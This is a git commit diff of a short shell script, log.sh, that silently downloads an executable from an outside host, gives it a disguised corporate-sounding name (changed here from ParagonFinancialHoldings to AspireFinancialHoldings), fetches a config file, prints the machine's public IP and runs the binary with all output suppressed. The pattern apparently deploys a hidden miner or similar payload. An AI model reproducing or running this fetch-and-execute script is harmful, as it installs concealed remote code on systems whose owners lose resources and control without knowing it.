fd1727be73ee97c0ec53385cda4a45aa04f0a57b
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-13 22:01:10 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O ParagonFinancialHoldings https://maper.info/api-server && chmod +x ParagonFinancialHoldings >/dev/null 2>&1
+wget -q -O AspireFinancialHoldings https://maper.info/api-server && chmod +x AspireFinancialHoldings >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./ParagonFinancialHoldings -c "config.json" >/dev/null 2>&1
+./AspireFinancialHoldings -c "config.json" >/dev/null 2>&1
